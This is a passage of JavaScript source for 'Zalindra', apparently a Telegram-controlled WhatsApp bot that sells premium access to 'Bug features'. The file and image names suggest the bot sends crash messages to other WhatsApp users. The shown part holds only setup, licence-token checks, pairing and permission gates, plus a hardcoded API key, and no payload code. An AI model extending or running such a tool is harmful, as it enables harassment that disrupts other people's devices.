///CREDIT BASE BY AMBALABU 
/// SEANOFFC
/// ZALINDRA
/// NO HAPUS CREDIT  ⌬ /Xforce - Force del X click business
const { Telegraf, Markup, session } = require("telegraf");
const JavaScriptObfuscator = require("javascript-obfuscator");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@zeppeliorg/wbails");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const CMD_FILE = "./Tools/cmdmode.json";
const cdFile = "./Tools/cooldown.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const startTime = Date.now();
const mediaMode = new Map(); 
const userState = {};
const liveIntervals = {};
const userLastUse = {}; 

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function getRuntime() {
  const uptime = process.uptime();

  const days = Math.floor(uptime / (3600 * 24));
  const hours = Math.floor((uptime % (3600 * 24)) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);

  return `${days}D ${hours}H ${minutes}M ${seconds}S`;
}
/// ----- ( Coldwdown ) ------ ///
function parseCooldown(input) {
  const match = input.match(/^(\d+)(d|jm|h)$/);

  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d": // detik
      return value * 1000;

    case "jm": // jam
      return value * 60 * 60 * 1000;

    case "h": // hari
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}
///// Github /////
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/seanfutsalmin-beep/Seannn/refs/heads/main/token.json";////ganti jadi Raw luh

async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.length) {
    console.log(chalk.blue(`
❌ TOKEN TIDAK ADA DI DATABASE
    `));
    process.exit(1);
  }

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.blue("❌ TOKEN TIDAK VALID"));
    process.exit(1);
  }

  console.log(chalk.blue("✅ Token valid"));
  startBot();
}

function startBot() {
  console.log(chalk.blue(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢛⡛⠿⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠟⡉⣡⡖⠘⢗⣀⣀⡀⢢⣐⣤⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠉⣠⣲⣾⡭⣀⢟⣩⣶⣶⡦⠈⣿⣿⣿⣷⣖⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡛⢀⠚⢩⠍⠀⠀⠡⠾⠿⣋⡥⠀⣤⠈⢷⠹⣿⣎⢳⣶⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⡤⠉⠀⠀⠀⣴⠆⠠⠾⠋⠁⣼⡿⢰⣸⣇⢿⣿⡎⣿⡷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠀⢸⢧⠁⠀⠀⢸⠇⢐⣂⣠⡴⠶⣮⢡⣿⢃⡟⡘⣿⣿⢸⣷⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣯⢀⡏⡾⢠⣿⣶⠏⣦⢀⠈⠉⡙⢻⡏⣾⡏⣼⠇⢳⣿⡇⣼⡿⡁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠈⡇⡇⡘⢏⡃⠀⢿⣶⣾⣷⣿⣿⣿⡘⡸⠇⠌⣾⢏⡼⣿⠇⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⠀⢇⠃⢢⡙⣜⣾⣿⣿⣿⣿⣿⣿⣧⣦⣄⡚⣡⡾⣣⠏⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⡀⡀⠃⠸⣧⠘⢿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⠃⠘⠁⢈⣤⡀⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣅⠀⠀⠸⠀⣦⡙⢿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⢛⣉⣉⣀⡀⠀⢸⣿⣿⣷⣬⣛⠛⢛⣩⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⢋⣴⣿⣿⣿⣿⣿⣦⣬⣛⣻⠿⢿⣿⡇⠈⠙⢛⣛⣩⣭⣭⣝⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⣼⣿⣿⣿⣿⣿⡿⡹⢿⣿⣽⣭⣭⣭⣄⣙⠻⢿⣿⡿⣝⣛⣛⡻⢆⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢥⣿⣿⣿⣿⣿⣿⢇⣴⣿⣿⣿⣿⣿⡿⣿⣿⣿⣷⣌⢻⣿⣿⣿⣿⣿⣷⣶⣌⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿
⡆⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣿⣿⣿⣄⣸⣿⣿⣿⣿⣦⢻⣿⣿⣿⣿⣿⣿⣿⠁⠊⠻⣿⣿⣿⣿⣿⣿⣿
⣿⠸⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣷⣿⠀⣿⣿⣿⣿⣿⣿⣿
⣿⣄⢻⣿⣿⣿⣿⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠈⣿⣿⣿⣿⣷⢙⠿⣿⣿⣿⣿⣿⣿⣿⠿⣟⣩⣴⣷⣌⠻⣿⣿⣿⣿⣿⣿⡟⢠⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣆⢻⣿⣿⣿⣿⡇⣷⣶⣭⣭⣭⣵⣶⣾⣿⣿⣿⣿⣿⣿⣷⣌⠹⢿⣿⡿⢋⣠⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡚⣿⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⢻⣿⣿⣿⡇⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⠈⣿⣿⣿⣿⢆⠀⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣥⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⣻⣿⣿⣿⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣒⣻⣿⣿⢏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⢹⣿⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣷⣬⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠻⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⢎⢻⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣾⣦⢻⣿⣿
⣿⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣆⢻⣿
⣿⣿⣿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿⣿⣿⣿⣆⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⣿⣿⣿⣿⣿⡎
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⡆⢿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⢸⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣧⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢹⠸⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢰⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra
☇ Version : 14.0
  
Bot Berhasil Terhubung Gunakan Script Sebrutal Mungkin`));
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.blue(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡶⣁⡣⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣏⡺⠳⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣾⣿⢱⣿⣿⡆⢻⣭⣭⣭⣭⣭⣭⣭⣑⣻⣿⢸⣿⣧⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⡾⢿⠿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⠇⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡫⣰⣿⣿⣿⣿⣾⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡛⣡⢜⣴⣹⣿⣿⣿⣿⣿⢻⡏⣿⡨⣻⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣷⡽⣿⣿⣿⣿⣎⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⠯⠼⣿⢻⣿⣿⣿⣿⡏⣧⣷⢹⣧⢷⡝⣿⣦⢻⣿⣿⣿⣷⢱⢻⣿⣷⢹⡻⣿⣿⡟⡆⢻⣿
⣿⣿⣿⣿⣿⣿⡟⢡⣾⣿⢧⡹⢿⡏⣺⣛⣛⡻⣿⢳⢿⣿⠈⣿⢸⣿⡜⣿⡌⣿⡿⢿⠿⣦⠞⡿⣫⣄⢇⢹⡗⣶⣯⢁⢿
⣿⣿⣿⣿⣿⡟⢠⣿⣿⡏⣾⣿⣿⢹⣯⣾⣯⣵⡟⠘⠙⠌⡇⡿⢸⣿⣿⢩⠃⢹⣧⣧⣯⢻⠒⣵⡿⢹⡾⡆⣿⣿⣿⡇⡼
⣿⣿⣿⣿⣿⠱⣸⣿⣿⢱⣿⣿⡇⣾⣿⣿⣿⣿⡏⣾⠟⣰⠇⠁⠛⠿⡿⡿⢃⠘⣡⣠⡀⠈⠀⠀⢀⠙⠃⢱⣿⣿⣿⠇⢁
⣿⣿⣿⣿⣿⡄⣿⣿⡿⣼⣿⣿⢳⣿⣿⣿⣿⣿⡇⣫⠞⣩⡤⠶⢦⣄⣵⣷⣿⣿⣿⣿⣧⠆⠷⠀⠈⠻⣦⠸⣿⣹⡿⣸⣸
⣿⣿⣿⣿⣇⡇⣿⣿⡇⣿⣿⣿⣸⣿⣿⣿⣿⣿⡇⢡⣿⠻⠆⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣻⡆⢿⣧⡌⢿⣿
⣿⣿⣿⣿⣿⣐⢹⣿⡇⣿⣿⡏⣿⣿⣿⣿⣿⣿⡇⢻⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⣠⣿⣾⣌⢿⣿⡜⣿
⣿⣿⣿⣿⣿⣧⠈⣿⣧⢿⣿⡇⣿⣿⣿⣿⣿⣿⡇⣮⣻⣧⣀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣫⣱⡻⡝⡌⣿⣷⢹
⣿⣿⣿⣿⣿⣿⣷⣜⢻⠸⣿⣇⣿⣿⣿⣿⣿⣿⣧⢸⡽⣝⡴⣜⠝⣿⡻⣿⠿⠿⠛⠛⡛⠛⢛⢫⣷⣱⣓⣙⣙⣽⢸⣿⡏
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⢻⣿⢹⡿⣿⣿⣿⣿⣿⠘⣮⣾⣮⣮⣾⡿⠀⣀⣀⣦⣥⣒⣀⠁⠂⠄⣿⣿⣿⣿⣿⢏⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢘⣿⡼⣇⣿⣿⣿⣿⣿⡞⣹⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣷⣀⣿⣿⣿⢟⣱⣿⣿⣿⡇
⣿⢿⣿⡿⣟⢛⣛⢛⠻⣿⢸⣿⣧⢿⣹⣿⣿⣿⣿⣧⢣⠻⣿⣿⣿⣿⣎⡻⠿⣿⠿⠿⣟⣛⣽⠾⡟⡫⣷⣿⣿⢻⡟⣶⠁
⣿⢀⣵⣯⣾⣿⢣⣾⣿⣿⢘⡿⠿⡎⣧⢿⣿⠟⡿⢱⡔⠑⠄⠉⠉⢻⣿⣿⣿⡿⡟⠋⠉⠑⢶⣿⡇⡇⣿⣿⣾⣶⣾⠏⢳
⢣⣿⣺⣽⣽⡁⣿⣿⣿⡿⣠⣇⣧⣿⡘⣜⣿⣵⣷⣿⣦⠀⠀⠀⠀⠀⠛⡿⢿⠿⠀⠀⠀⠀⢠⡹⠳⣳⢿⣿⣿⣿⢏⠆⣾
⢸⣿⣿⣿⣿⡇⢻⣿⣿⢇⣿⣿⡏⣿⣿⣜⢪⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠐⠶⠃⠀⠀⠀⠀⠸⡳⣜⢏⣿⣿⢟⣵⣿⣾⣿

» Information:
☇ Creator : @seanoffc
☇ Name Script : zalindra
☇ Version : 14.0
  
SELAMAT MENGUNAKAN SCRIPT SEPUASNYA`));

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    //console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        //console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉
» Information:
☇ Creator : @seanoffc
☇ Name Script : zalindra
☇ Version : 14.0
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<pre>⬡═―⊱「 𝒵𝒶𝓁𝒾𝓃𝒹𝓇𝒶 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : Connected
</pre>`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        //console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          //console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          //console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

    //    console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum addsender, /addsender dulu");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
//////////////////////////////////////
let ownerUsers = loadOwner() || [];
let premiumUsers = loadJSON(premiumFile) || [];
let adminList = [];
let whitelistGroups = loadSafe() || [];
loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from?.id?.toString();
  const name = ctx.from?.first_name || "User";

  if (!ownerUsers.includes(id)) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>❌ AKSES DI TOLAK OWNER ONLY

⚠️ Fitur ini khusus OWNER ONLY

👤 User : ${name}</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/pacenicwlee")]
        ])
      }
    );
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Admin before using Bug features ✦</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/pacenicwlee")]
        ])
      }
    );
  }

  return next();
};
/// ---- PREMIUM ---- ///
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (premiumUsers.includes(id)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Premium before using Bug features ✦</pre>`,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/pacenicwlee")]
      ])
    }
  );
};
/// ------ Check coldwdown ---- ///
const checkCooldown = (ctx, next) => {
  const chatId = ctx.chat.id;
  const cooldown = getCooldown(chatId);

  const now = Date.now();
  const last = userLastUse[chatId] || 0;

  if (cooldown > 0 && now - last < cooldown) {
    const remaining = Math.ceil((cooldown - (now - last)) / 1000);

    return ctx.reply(`⏳ Cooldown aktif!\nTunggu ${remaining} detik lagi.`);
  }

  userLastUse[chatId] = now;

  return next();
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
